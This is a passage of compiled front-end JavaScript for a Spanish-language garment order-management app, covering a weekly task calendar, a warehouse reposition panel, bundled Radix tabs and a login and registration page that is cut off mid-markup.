        /* @__PURE__ */ jsx66(CardHeader, { children: /* @__PURE__ */ jsxs33(CardTitle, { className: "flex items-center", children: [
          /* @__PURE__ */ jsx66(Calendar, { className: "h-5 w-5 mr-2" }),
          "Calendario"
        ] }) }),
        /* @__PURE__ */ jsx66(CardContent, { children: /* @__PURE__ */ jsx66(
          Calendar2,
          {
            mode: "single",
            selected: selectedDate,
            onSelect: (date) => date && setSelectedDate(date),
            className: "rounded-md border"
          }
        ) })
      ] }),
      /* @__PURE__ */ jsxs33(Card, { className: "lg:col-span-3", children: [
        /* @__PURE__ */ jsxs33(CardHeader, { children: [
          /* @__PURE__ */ jsxs33("div", { className: "flex justify-between items-center", children: [
            /* @__PURE__ */ jsxs33(CardTitle, { className: "flex items-center", children: [
              /* @__PURE__ */ jsx66(Clock, { className: "h-5 w-5 mr-2" }),
              "Vista Semanal"
            ] }),
            /* @__PURE__ */ jsxs33("div", { className: "flex items-center space-x-2", children: [
              /* @__PURE__ */ jsx66(Button, { variant: "outline", size: "sm", onClick: goToPreviousWeek, children: /* @__PURE__ */ jsx66(ChevronLeft, { className: "h-4 w-4" }) }),
              /* @__PURE__ */ jsx66(Button, { variant: "outline", size: "sm", onClick: goToCurrentWeek, children: "Hoy" }),
              /* @__PURE__ */ jsx66(Button, { variant: "outline", size: "sm", onClick: goToNextWeek, children: /* @__PURE__ */ jsx66(ChevronRight, { className: "h-4 w-4" }) })
            ] })
          ] }),
          /* @__PURE__ */ jsxs33("p", { className: "text-sm text-gray-600", children: [
            currentWeekStart.toLocaleDateString("es-MX", {
              day: "numeric",
              month: "long"
            }),
            " - ",
            weekDays[4].toLocaleDateString("es-MX", {
              day: "numeric",
              month: "long",
              year: "numeric"
            })
          ] })
        ] }),
        /* @__PURE__ */ jsx66(CardContent, { children: loading ? /* @__PURE__ */ jsx66("p", { children: "Cargando tareas..." }) : /* @__PURE__ */ jsx66("div", { className: "grid grid-cols-5 gap-4", children: weekDays.map((day, index2) => {
          const dayEvents = getEventsForDate(day);
          const dayName = getDayName(day).charAt(0).toUpperCase() + getDayName(day).slice(1);
          return /* @__PURE__ */ jsxs33("div", { className: `border rounded-lg overflow-hidden min-h-[320px] ${isToday(day) ? "bg-blue-50 border-blue-300" : "bg-gray-50 border-gray-200"}`, children: [
            /* @__PURE__ */ jsxs33("div", { className: `text-center py-3 border-b ${isToday(day) ? "bg-blue-100 border-blue-200" : "bg-white border-gray-200"}`, children: [
              /* @__PURE__ */ jsx66("div", { className: `text-sm font-semibold uppercase tracking-wide ${isToday(day) ? "text-blue-700" : "text-gray-600"}`, children: dayName }),
              /* @__PURE__ */ jsx66("div", { className: `text-2xl font-bold ${isToday(day) ? "text-blue-800" : "text-gray-800"}`, children: day.getDate() })
            ] }),
            /* @__PURE__ */ jsxs33("div", { className: "p-3 space-y-2 max-h-[260px] overflow-y-auto", children: [
              dayEvents.map((event) => /* @__PURE__ */ jsxs33(
                "div",
                {
                  className: "bg-white border border-gray-200 rounded-md p-3 hover:shadow-sm cursor-pointer group transition-all duration-150 hover:border-gray-300",
                  onClick: () => canCreateEdit && startEdit(event),
                  children: [
                    /* @__PURE__ */ jsxs33("div", { className: "flex items-start justify-between mb-2", children: [
                      /* @__PURE__ */ jsxs33("div", { className: "flex items-center space-x-2", children: [
                        /* @__PURE__ */ jsx66("div", { className: `w-2.5 h-2.5 rounded-full flex-shrink-0 ${getPriorityColor(event.priority)}` }),
                        /* @__PURE__ */ jsx66("span", { className: "text-xs font-medium text-gray-500", children: formatDisplayTime(event.time) })
                      ] }),
                      /* @__PURE__ */ jsx66(Badge, { className: `${getStatusColor(event.status)} text-xs px-1.5 py-0.5 font-medium`, children: event.status })
                    ] }),
                    /* @__PURE__ */ jsx66("div", { className: "font-medium text-gray-900 text-sm mb-2 leading-tight", children: event.title }),
                    /* @__PURE__ */ jsx66("div", { className: "flex items-center justify-between mb-2", children: /* @__PURE__ */ jsx66("span", { className: "text-xs text-gray-500 bg-gray-100 px-2 py-1 rounded-full", children: getAreaDisplayName(event.assignedToArea) }) }),
                    event.description && /* @__PURE__ */ jsx66("div", { className: "text-xs text-gray-600 leading-relaxed line-clamp-2 mb-2", children: event.description }),
                    canCreateEdit && /* @__PURE__ */ jsxs33("div", { className: "flex justify-end space-x-1 opacity-0 group-hover:opacity-100 transition-opacity", children: [
                      /* @__PURE__ */ jsx66(
                        Button,
                        {
                          size: "sm",
                          variant: "ghost",
                          onClick: (e) => {
                            e.stopPropagation();
                            startEdit(event);
                          },
                          className: "h-6 w-6 p-0 hover:bg-blue-100",
                          children: /* @__PURE__ */ jsx66(SquarePen, { className: "h-3 w-3" })
                        }
                      ),
                      /* @__PURE__ */ jsx66(
                        Button,
                        {
                          size: "sm",
                          variant: "ghost",
                          onClick: (e) => {
                            e.stopPropagation();
                            handleDelete(event.id);
                          },
                          className: "h-6 w-6 p-0 hover:bg-red-100",
                          children: /* @__PURE__ */ jsx66(Trash2, { className: "h-3 w-3" })
                        }
                      )
                    ] }),
                    !canCreateEdit && event.assignedToArea === user?.area && event.status === "pendiente" && /* @__PURE__ */ jsx66("div", { className: "flex justify-end", children: /* @__PURE__ */ jsx66(
                      Button,
                      {
                        size: "sm",
                        variant: "ghost",
                        onClick: (e) => {
                          e.stopPropagation();
                          handleStatusUpdate(event.id, "completado");
                        },
                        className: "h-6 w-6 p-0 text-green-600 hover:bg-green-100",
                        children: /* @__PURE__ */ jsx66(CircleCheckBig, { className: "h-3 w-3" })
                      }
                    ) })
                  ]
                },
                event.id
              )),
              dayEvents.length === 0 && /* @__PURE__ */ jsx66("div", { className: "text-gray-400 text-center text-xs py-8", children: "Sin tareas programadas" })
            ] })
          ] }, index2);
        }) }) })
      ] })
    ] })
  ] }) });
}

// client/src/components/repositions/AlmacenPanel.tsx
import { useState as useState40 } from "react";
import { jsx as jsx67, jsxs as jsxs34 } from "react/jsx-runtime";
var statusColors3 = {
  pendiente: "bg-yellow-100 text-yellow-800",
  aprobado: "bg-green-100 text-green-800",
  rechazado: "bg-red-100 text-red-800",
  en_proceso: "bg-blue-100 text-blue-800",
  completado: "bg-gray-100 text-gray-800"
};
var urgencyColors3 = {
  urgente: "bg-red-100 text-red-800",
  intermedio: "bg-yellow-100 text-yellow-800",
  poco_urgente: "bg-green-100 text-green-800"
};
function AlmacenPanel() {
  const [selectedReposition, setSelectedReposition] = useState40(null);
  const [pauseDialog, setPauseDialog] = useState40(false);
  const [pauseReason, setPauseReason] = useState40("");
  const { toast: toast2 } = useToast();
  const queryClient2 = useQueryClient();
  const { data: repositions = [], isLoading, error, refetch } = useQuery({
    queryKey: ["repositions", "almacen"],
    queryFn: async () => {
      const response = await fetch("/api/almacen/repositions");
      if (!response.ok) throw new Error("Failed to fetch repositions");
      return response.json();
    },
    refetchInterval: 5e3,
    // Refetch every 5 seconds
    refetchOnMount: true,
    refetchOnWindowFocus: true
  });
  const pauseMutation = useMutation({
    mutationFn: async ({ id: id2, reason }) => {
      const response = await fetch(`/api/almacen/repositions/${id2}/pause`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ reason })
      });
      if (!response.ok) throw new Error("Failed to pause reposition");
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["/api/almacen/repositions"] });
      setPauseDialog(false);
      setPauseReason("");
      setSelectedReposition(null);
      toast2({ title: "\xC9xito", description: "Reposici\xF3n pausada correctamente" });
    },
    onError: () => {
      toast2({ title: "Error", description: "No se pudo pausar la reposici\xF3n", variant: "destructive" });
    }
  });
  const resumeMutation = useMutation({
    mutationFn: async (id2) => {
      const response = await fetch(`/api/almacen/repositions/${id2}/resume`, {
        method: "POST",
        headers: { "Content-Type": "application/json" }
      });
      if (!response.ok) throw new Error("Failed to resume reposition");
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["/api/almacen/repositions"] });
      toast2({ title: "\xC9xito", description: "Reposici\xF3n reanudada correctamente" });
    },
    onError: () => {
      toast2({ title: "Error", description: "No se pudo reanudar la reposici\xF3n", variant: "destructive" });
    }
  });
  const handlePause = () => {
    if (!selectedReposition || !pauseReason.trim()) return;
    pauseMutation.mutate({
      id: selectedReposition,
      reason: pauseReason.trim()
    });
  };
  const handleResume = (id2) => {
    resumeMutation.mutate(id2);
  };
  const openPauseDialog = (reposition) => {
    setSelectedReposition(reposition.id);
    setPauseDialog(true);
  };
  if (isLoading) {
    return /* @__PURE__ */ jsx67("div", { className: "text-center py-8", children: "Cargando reposiciones..." });
  }
  return /* @__PURE__ */ jsxs34("div", { className: "space-y-6", children: [
    /* @__PURE__ */ jsxs34("div", { className: "flex justify-between items-center", children: [
      /* @__PURE__ */ jsx67("h1", { className: "text-2xl font-bold", children: "Panel de Almac\xE9n" }),
      /* @__PURE__ */ jsxs34("div", { className: "text-sm text-gray-600", children: [
        "Total: ",
        repositions.length,
        " reposiciones"
      ] })
    ] }),
    /* @__PURE__ */ jsx67("div", { className: "grid gap-4", children: repositions.map((reposition) => /* @__PURE__ */ jsxs34(Card, { className: `${reposition.isPaused ? "border-red-300 bg-red-50" : ""}`, children: [
      /* @__PURE__ */ jsx67(CardHeader, { className: "pb-3", children: /* @__PURE__ */ jsx67("div", { className: "flex justify-between items-start", children: /* @__PURE__ */ jsxs34("div", { children: [
        /* @__PURE__ */ jsxs34(CardTitle, { className: "text-lg flex items-center gap-2", children: [
          reposition.folio,
          reposition.isPaused && /* @__PURE__ */ jsx67(TriangleAlert, { className: "w-5 h-5 text-red-500" })
        ] }),
        /* @__PURE__ */ jsxs34("div", { className: "flex gap-2 mt-2", children: [
          /* @__PURE__ */ jsx67(Badge, { variant: "outline", children: reposition.type }),
          /* @__PURE__ */ jsx67(Badge, { className: statusColors3[reposition.status], children: reposition.status }),
          /* @__PURE__ */ jsx67(Badge, { className: urgencyColors3[reposition.urgencia], children: reposition.urgencia })
        ] })
      ] }) }) }),
      /* @__PURE__ */ jsx67(CardContent, { children: /* @__PURE__ */ jsxs34("div", { className: "space-y-3", children: [
        /* @__PURE__ */ jsxs34("div", { className: "grid grid-cols-2 gap-4 text-sm", children: [
          /* @__PURE__ */ jsxs34("div", { children: [
            /* @__PURE__ */ jsx67("span", { className: "font-medium", children: "Solicitante:" }),
            /* @__PURE__ */ jsxs34("p", { children: [
              reposition.solicitanteNombre,
              " (",
              reposition.solicitanteArea,
              ")"
            ] })
          ] }),
          /* @__PURE__ */ jsxs34("div", { children: [
            /* @__PURE__ */ jsx67("span", { className: "font-medium", children: "Modelo:" }),
            /* @__PURE__ */ jsx67("p", { children: reposition.modeloPrenda })
          ] }),
          /* @__PURE__ */ jsxs34("div", { children: [
            /* @__PURE__ */ jsx67("span", { className: "font-medium", children: "Tela:" }),
            /* @__PURE__ */ jsxs34("p", { children: [
              reposition.tela,
              " - ",
              reposition.color
            ] })
          ] }),
          /* @__PURE__ */ jsxs34("div", { children: [
            /* @__PURE__ */ jsx67("span", { className: "font-medium", children: "Tipo de Pieza:" }),
            /* @__PURE__ */ jsx67("p", { children: reposition.tipoPieza })
          ] }),
          reposition.consumoTela && /* @__PURE__ */ jsxs34("div", { children: [
            /* @__PURE__ */ jsx67("span", { className: "font-medium", children: "Consumo de Tela:" }),
            /* @__PURE__ */ jsxs34("p", { children: [
              reposition.consumoTela,
              " metros"
            ] })
          ] }),
          /* @__PURE__ */ jsxs34("div", { children: [
            /* @__PURE__ */ jsx67("span", { className: "font-medium", children: "\xC1rea Actual:" }),
            /* @__PURE__ */ jsx67("p", { children: reposition.currentArea })
          ] }),
          /* @__PURE__ */ jsxs34("div", { children: [
            /* @__PURE__ */ jsx67("span", { className: "font-medium", children: "Creado:" }),
            /* @__PURE__ */ jsx67("p", { children: new Date(reposition.createdAt).toLocaleDateString() })
          ] })
        ] }),
        reposition.isPaused && reposition.pauseReason && /* @__PURE__ */ jsxs34("div", { className: "bg-red-50 border border-red-200 rounded p-3", children: [
          /* @__PURE__ */ jsx67("p", { className: "text-sm font-medium text-red-800", children: "Pausado por:" }),
          /* @__PURE__ */ jsx67("p", { className: "text-sm text-red-700", children: reposition.pauseReason })
        ] }),
        /* @__PURE__ */ jsx67("div", { className: "flex gap-2 pt-2", children: reposition.isPaused ? /* @__PURE__ */ jsx67(
          Button,
          {
            onClick: () => handleResume(reposition.id),
            disabled: resumeMutation.isPending,
            className: "bg-green-600 hover:bg-green-700",
            children: resumeMutation.isPending ? "Reanudando..." : "Reanudar"
          }
        ) : /* @__PURE__ */ jsxs34(
          Button,
          {
            onClick: () => openPauseDialog(reposition),
            disabled: pauseMutation.isPending,
            variant: "outline",
            className: "text-red-600 hover:bg-red-50",
            children: [
              /* @__PURE__ */ jsx67(Pause, { className: "w-4 h-4 mr-2" }),
              "Pausar"
            ]
          }
        ) })
      ] }) })
    ] }, reposition.id)) }),
    /* @__PURE__ */ jsx67(Dialog2, { open: pauseDialog, onOpenChange: (open) => {
      setPauseDialog(open);
      if (!open) {
        setPauseReason("");
        setSelectedReposition(null);
      }
    }, children: /* @__PURE__ */ jsxs34(DialogContent2, { children: [
      /* @__PURE__ */ jsx67(DialogHeader, { children: /* @__PURE__ */ jsx67(DialogTitle2, { children: "Pausar Reposici\xF3n" }) }),
      /* @__PURE__ */ jsxs34("div", { className: "space-y-4", children: [
        /* @__PURE__ */ jsx67("p", { className: "text-sm text-gray-600", children: "Al pausar esta reposici\xF3n, se detendr\xE1 temporalmente su procesamiento. Debes explicar el motivo de la pausa." }),
        /* @__PURE__ */ jsxs34("div", { children: [
          /* @__PURE__ */ jsx67(Label2, { htmlFor: "pause-reason", children: "Motivo de la pausa *" }),
          /* @__PURE__ */ jsx67(
            Textarea,
            {
              id: "pause-reason",
              value: pauseReason,
              onChange: (e) => setPauseReason(e.target.value),
              placeholder: "Ejemplo: Falta de material espec\xEDfico, problema con maquinaria, etc...",
              required: true,
              rows: 4
            }
          )
        ] })
      ] }),
      /* @__PURE__ */ jsxs34(DialogFooter, { children: [
        /* @__PURE__ */ jsx67(Button, { variant: "outline", onClick: () => setPauseDialog(false), children: "Cancelar" }),
        /* @__PURE__ */ jsx67(
          Button,
          {
            onClick: handlePause,
            disabled: !pauseReason.trim() || pauseReason.trim().length < 10,
            className: "bg-red-600 hover:bg-red-700",
            children: "Pausar Reposici\xF3n"
          }
        )
      ] })
    ] }) })
  ] });
}

// client/src/pages/almacen-page.tsx
import { useEffect as useEffect33 } from "react";
import { jsx as jsx68, jsxs as jsxs35 } from "react/jsx-runtime";
function AlmacenPage() {
  const { user } = useAuth();
  const { isConnected } = useWebSocket();
  useEffect33(() => {
    console.log("AlmacenPage cargada, WebSocket conectado:", isConnected);
  }, [isConnected]);
  if (user?.area !== "almacen") {
    return /* @__PURE__ */ jsx68("div", { className: "flex items-center justify-center min-h-screen", children: /* @__PURE__ */ jsx68(Card, { className: "max-w-md", children: /* @__PURE__ */ jsxs35(CardContent, { className: "p-6 text-center", children: [
      /* @__PURE__ */ jsx68(Shield, { className: "mx-auto h-12 w-12 text-red-500 mb-4" }),
      /* @__PURE__ */ jsx68("h2", { className: "text-xl font-semibold mb-2", children: "Acceso Denegado" }),
      /* @__PURE__ */ jsx68("p", { className: "text-gray-600", children: "Solo los usuarios de almac\xE9n pueden acceder a esta p\xE1gina." })
    ] }) }) });
  }
  return /* @__PURE__ */ jsx68(Layout, { children: /* @__PURE__ */ jsx68("div", { className: "container mx-auto p-6", children: /* @__PURE__ */ jsx68(AlmacenPanel, {}) }) });
}

// client/src/pages/auth-page.tsx
import { useState as useState41 } from "react";

// client/src/components/ui/tabs.tsx
import * as React67 from "react";

// node_modules/@radix-ui/react-tabs/dist/index.mjs
import * as React66 from "react";
import { jsx as jsx69 } from "react/jsx-runtime";
var TABS_NAME = "Tabs";
var [createTabsContext, createTabsScope] = createContextScope(TABS_NAME, [
  createRovingFocusGroupScope
]);
var useRovingFocusGroupScope2 = createRovingFocusGroupScope();
var [TabsProvider, useTabsContext] = createTabsContext(TABS_NAME);
var Tabs = React66.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeTabs,
      value: valueProp,
      onValueChange,
      defaultValue,
      orientation = "horizontal",
      dir,
      activationMode = "automatic",
      ...tabsProps
    } = props;
    const direction = useDirection(dir);
    const [value, setValue] = useControllableState({
      prop: valueProp,
      onChange: onValueChange,
      defaultProp: defaultValue ?? "",
      caller: TABS_NAME
    });
    return /* @__PURE__ */ jsx69(
      TabsProvider,
      {
        scope: __scopeTabs,
        baseId: useId(),
        value,
        onValueChange: setValue,
        orientation,
        dir: direction,
        activationMode,
        children: /* @__PURE__ */ jsx69(
          Primitive.div,
          {
            dir: direction,
            "data-orientation": orientation,
            ...tabsProps,
            ref: forwardedRef
          }
        )
      }
    );
  }
);
Tabs.displayName = TABS_NAME;
var TAB_LIST_NAME = "TabsList";
var TabsList = React66.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTabs, loop = true, ...listProps } = props;
    const context = useTabsContext(TAB_LIST_NAME, __scopeTabs);
    const rovingFocusGroupScope = useRovingFocusGroupScope2(__scopeTabs);
    return /* @__PURE__ */ jsx69(
      Root7,
      {
        asChild: true,
        ...rovingFocusGroupScope,
        orientation: context.orientation,
        dir: context.dir,
        loop,
        children: /* @__PURE__ */ jsx69(
          Primitive.div,
          {
            role: "tablist",
            "aria-orientation": context.orientation,
            ...listProps,
            ref: forwardedRef
          }
        )
      }
    );
  }
);
TabsList.displayName = TAB_LIST_NAME;
var TRIGGER_NAME4 = "TabsTrigger";
var TabsTrigger = React66.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTabs, value, disabled = false, ...triggerProps } = props;
    const context = useTabsContext(TRIGGER_NAME4, __scopeTabs);
    const rovingFocusGroupScope = useRovingFocusGroupScope2(__scopeTabs);
    const triggerId = makeTriggerId(context.baseId, value);
    const contentId = makeContentId(context.baseId, value);
    const isSelected = value === context.value;
    return /* @__PURE__ */ jsx69(
      Item2,
      {
        asChild: true,
        ...rovingFocusGroupScope,
        focusable: !disabled,
        active: isSelected,
        children: /* @__PURE__ */ jsx69(
          Primitive.button,
          {
            type: "button",
            role: "tab",
            "aria-selected": isSelected,
            "aria-controls": contentId,
            "data-state": isSelected ? "active" : "inactive",
            "data-disabled": disabled ? "" : void 0,
            disabled,
            id: triggerId,
            ...triggerProps,
            ref: forwardedRef,
            onMouseDown: composeEventHandlers(props.onMouseDown, (event) => {
              if (!disabled && event.button === 0 && event.ctrlKey === false) {
                context.onValueChange(value);
              } else {
                event.preventDefault();
              }
            }),
            onKeyDown: composeEventHandlers(props.onKeyDown, (event) => {
              if ([" ", "Enter"].includes(event.key)) context.onValueChange(value);
            }),
            onFocus: composeEventHandlers(props.onFocus, () => {
              const isAutomaticActivation = context.activationMode !== "manual";
              if (!isSelected && !disabled && isAutomaticActivation) {
                context.onValueChange(value);
              }
            })
          }
        )
      }
    );
  }
);
TabsTrigger.displayName = TRIGGER_NAME4;
var CONTENT_NAME5 = "TabsContent";
var TabsContent = React66.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTabs, value, forceMount, children, ...contentProps } = props;
    const context = useTabsContext(CONTENT_NAME5, __scopeTabs);
    const triggerId = makeTriggerId(context.baseId, value);
    const contentId = makeContentId(context.baseId, value);
    const isSelected = value === context.value;
    const isMountAnimationPreventedRef = React66.useRef(isSelected);
    React66.useEffect(() => {
      const rAF = requestAnimationFrame(() => isMountAnimationPreventedRef.current = false);
      return () => cancelAnimationFrame(rAF);
    }, []);
    return /* @__PURE__ */ jsx69(Presence, { present: forceMount || isSelected, children: ({ present }) => /* @__PURE__ */ jsx69(
      Primitive.div,
      {
        "data-state": isSelected ? "active" : "inactive",
        "data-orientation": context.orientation,
        role: "tabpanel",
        "aria-labelledby": triggerId,
        hidden: !present,
        id: contentId,
        tabIndex: 0,
        ...contentProps,
        ref: forwardedRef,
        style: {
          ...props.style,
          animationDuration: isMountAnimationPreventedRef.current ? "0s" : void 0
        },
        children: present && children
      }
    ) });
  }
);
TabsContent.displayName = CONTENT_NAME5;
function makeTriggerId(baseId, value) {
  return `${baseId}-trigger-${value}`;
}
function makeContentId(baseId, value) {
  return `${baseId}-content-${value}`;
}
var Root26 = Tabs;
var List = TabsList;
var Trigger4 = TabsTrigger;
var Content4 = TabsContent;

// client/src/components/ui/tabs.tsx
import { jsx as jsx70 } from "react/jsx-runtime";
var Tabs2 = Root26;
var TabsList2 = React67.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx70(
  List,
  {
    ref,
    className: cn(
      "inline-flex h-10 items-center justify-center rounded-md bg-muted p-1 text-muted-foreground",
      className
    ),
    ...props
  }
));
TabsList2.displayName = List.displayName;
var TabsTrigger2 = React67.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx70(
  Trigger4,
  {
    ref,
    className: cn(
      "inline-flex items-center justify-center whitespace-nowrap rounded-sm px-3 py-1.5 text-sm font-medium ring-offset-background transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 data-[state=active]:bg-background data-[state=active]:text-foreground data-[state=active]:shadow-sm",
      className
    ),
    ...props
  }
));
TabsTrigger2.displayName = Trigger4.displayName;
var TabsContent2 = React67.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx70(
  Content4,
  {
    ref,
    className: cn(
      "mt-2 ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2",
      className
    ),
    ...props
  }
));
TabsContent2.displayName = Content4.displayName;

// client/src/pages/auth-page.tsx
import { jsx as jsx71, jsxs as jsxs36 } from "react/jsx-runtime";
function AuthPage() {
  const { user, loginMutation, registerMutation } = useAuth();
  const [loginData, setLoginData] = useState41({ username: "", password: "" });
  const [registerData, setRegisterData] = useState41({
    username: "",
    password: "",
    name: "",
    area: "",
    adminPassword: ""
  });
  if (user) {
    return /* @__PURE__ */ jsx71(Redirect, { to: "/" });
  }
  const handleLogin = (e) => {
    e.preventDefault();
    loginMutation.mutate(loginData);
  };
  const handleRegister = (e) => {
    e.preventDefault();
    registerMutation.mutate(registerData);
  };
  return /* @__PURE__ */ jsxs36("div", { className: "min-h-screen flex bg-gray-50", children: [
    /* @__PURE__ */ jsx71("div", { className: "flex-1 flex items-center justify-center p-12 bg-white", children: /* @__PURE__ */ jsxs36("div", { className: "w-full max-w-md rounded-2xl shadow-xl p-10", children: [
      /* @__PURE__ */ jsxs36("div", { className: "text-center mb-10", children: [
        /* @__PURE__ */ jsx71(
          "img",
          {
            src: "/LogoJASANA.png",
            alt: "JASANA Logo",
            className: "mx-auto w-35 h-35 object-contain mb-4",
            draggable: false
          }
        ),
        /* @__PURE__ */ jsx71("p", { className: "text-gray-600 mt-1 font-medium", children: "Sistema de Gesti\xF3n de Pedidos" })
      ] }),
      /* @__PURE__ */ jsxs36(Tabs2, { defaultValue: "login", className: "w-full", children: [
        /* @__PURE__ */ jsxs36(TabsList2, { className: "grid grid-cols-2 rounded-xl bg-gray-100 shadow-inner mb-4", children: [
          /* @__PURE__ */ jsx71(
            TabsTrigger2,
            {
              value: "login",
              className: "text-gray-700 font-semibold hover:bg-primary hover:text-white transition-colors",
              children: "Iniciar Sesi\xF3n"
            }
          ),
          /* @__PURE__ */ jsx71(
            TabsTrigger2,
            {
              value: "register",
              className: "text-gray-700 font-semibold hover:bg-primary hover:text-white transition-colors",
              children: "Registrarse"
            }
          )
        ] }),
        /* @__PURE__ */ jsx71(TabsContent2, { value: "login", children: /* @__PURE__ */ jsxs36(Card, { className: "mt-2 shadow-md border border-gray-200", children: [
          /* @__PURE__ */ jsx71(CardHeader, {}),
          /* @__PURE__ */ jsx71(CardContent, { children: /* @__PURE__ */ jsxs36("form", { onSubmit: handleLogin, className: "space-y-6", children: [
            /* @__PURE__ */ jsxs36("div", { children: [
              /* @__PURE__ */ jsx71(Label2, { htmlFor: "login-username", className: "font-semibold text-gray-700", children: "Usuario" }),
              /* @__PURE__ */ jsx71(
                Input,
                {
                  id: "login-username",
                  type: "text",
                  value: loginData.username,
                  onChange: (e) => setLoginData({ ...loginData, username: e.target.value }),
                  required: true,
                  className: "mt-1",
                  placeholder: "Ingrese su usuario"
                }
              )
            ] }),
            /* @__PURE__ */ jsxs36("div", { children: [
              /* @__PURE__ */ jsx71(Label2, { htmlFor: "login-password", className: "font-semibold text-gray-700", children: "Contrase\xF1a" }),
              /* @__PURE__ */ jsx71(
                Input,
                {
                  id: "login-password",
                  type: "password",
                  value: loginData.password,
                  onChange: (e) => setLoginData({ ...loginData, password: e.target.value }),
                  required: true,
                  className: "mt-1",
                  placeholder: "Ingrese su contrase\xF1a"
                }
              )
            ] }),
            /* @__PURE__ */ jsxs36(
              Button,
              {
                type: "submit",
                className: "w-full bg-primary hover:bg-primary-dark text-white font-semibold transition-colors flex justify-center items-center",
                disabled: loginMutation.isPending,
                children: [
                  loginMutation.isPending && /* @__PURE__ */ jsx71(LoaderCircle, { className: "mr-2 h-5 w-5 animate-spin" }),
                  "Iniciar Sesi\xF3n"
                ]
              }
            )
          ] }) })
        ] }) }),
        /* @__PURE__ */ jsx71(TabsContent2, { value: "register", children: /* @__PURE__ */ jsxs36(Card, { className: "mt-2 shadow-md border border-gray-200", children: [
          /* @__PURE__ */ jsx71(CardHeader, {}),
          /* @__PURE__ */ jsx71(CardContent, { children: /* @__PURE__ */ jsxs36("form", { onSubmit: handleRegister, className: "space-y-6", children: [
            /* @__PURE__ */ jsxs36("div", { children: [
              /* @__PURE__ */ jsx71(Label2, { htmlFor: "register-username", className: "font-semibold text-gray-700", children: "Usuario" }),
              /* @__PURE__ */ jsx71(
                Input,
                {
                  id: "register-username",
                  type: "text",
                  value: registerData.username,
                  onChange: (e) => setRegisterData({ ...registerData, username: e.target.value }),
                  required: true,
                  className: "mt-1",
                  placeholder: "Ingrese su usuario"
                }
              )
            ] }),
            /* @__PURE__ */ jsxs36("div", { children: [
              /* @__PURE__ */ jsx71(Label2, { htmlFor: "register-password", className: "font-semibold text-gray-700", children: "Contrase\xF1a" }),
              /* @__PURE__ */ jsx71(
                Input,
                {
                  id: "register-password",
                  type: "password",
                  value: registerData.password,
                  onChange: (e) => setRegisterData({ ...registerData, password: e.target.value }),
                  required: true,
                  className: "mt-1",
                  placeholder: "Ingrese su contrase\xF1a"
                }
              )
            ] }),
            /* @__PURE__ */ jsxs36("div", { children: [
              /* @__PURE__ */ jsx71(Label2, { htmlFor: "register-name", className: "font-semibold text-gray-700", children: "Nombre Completo" }),
              /* @__PURE__ */ jsx71(
                Input,
                {
                  id: "register-name",
                  type: "text",
                  value: registerData.name,
                  onChange: (e) => setRegisterData({ ...registerData, name: e.target.value }),
                  required: true,
                  className: "mt-1",
                  placeholder: "Ingrese su nombre completo"
                }
              )
            ] }),
            /* @__PURE__ */ jsxs36("div", { children: [
              /* @__PURE__ */ jsx71(Label2, { htmlFor: "register-area", className: "font-semibold text-gray-700", children: "\xC1rea" }),
              /* @__PURE__ */ jsxs36(
                Select2,
                {
                  value: registerData.area,
                  onValueChange: (value) => setRegisterData({ ...registerData, area: value }),
                  children: [
                    /* @__PURE__ */ jsx71(SelectTrigger2, { children: /* @__PURE__ */ jsx71(SelectValue2, { placeholder: "Seleccionar \xE1rea" }) }),
                    /* @__PURE__ */ jsxs36(SelectContent2, { children: [
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "corte", children: "Corte" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "bordado", children: "Bordado" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "ensamble", children: "Ensamble" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "plancha", children: "Plancha/Empaque" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "calidad", children: "Calidad" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "envios", children: "Env\xEDos" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "patronaje", children: "Patronaje" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "almacen", children: "Almac\xE9n" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "dise\xF1o", children: "Dise\xF1o" }),
                      /* @__PURE__ */ jsx71(SelectItem2, { value: "admin", children: "Admin" })
                    ] })
                  ]
                }
              )
            ] }),
            registerData.area !== "admin" && /* @__PURE__ */ jsxs36("div", { children: [
              /* @__PURE__ */ jsx71(Label2, { htmlFor: "admin-password", className: "font-semibold text-gray-700", children: "Contrase\xF1a de Admin" }),
              /* @__PURE__ */ jsx71(
                Input,
                {
                  id: "admin-password",
                  type: "password",
                  value: registerData.adminPassword,
                  onChange: (e) => setRegisterData({ ...registerData, adminPassword: e.target.value }),
                  required: true,
                  placeholder: "Requerida para registrarse",
                  className: "mt-1"
                }
              )
            ] }),
            /* @__PURE__ */ jsxs36(
              Button,
              {
                type: "submit",
                className: "w-full bg-primary hover:bg-primary-dark text-white font-semibold transition-colors flex justify-center items-center",
                disabled: registerMutation.isPending,
                children: [
                  registerMutation.isPending && /* @__PURE__ */ jsx71(LoaderCircle, { className: "mr-2 h-5 w-5 animate-spin" }),
                  "Registrarse"
                ]
              }
            )
          ] }) })
        ] }) })
      ] })
    ] }) }),
    /* @__PURE__ */ jsxs36(
      "div",
      {
        className: "flex-1 relative flex items-center justify-center p-12",
        style: {
          backgroundImage: `url('/client/public/background.jpg')`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat"
        },
        children: [
          /* @__PURE__ */ jsx71("div", { className: "absolute inset-0 bg-primary bg-opacity-80" }),
          /* @__PURE__ */ jsxs36("div", { className: "relative text-white text-center max-w-lg space-y-8 z-10", children: [
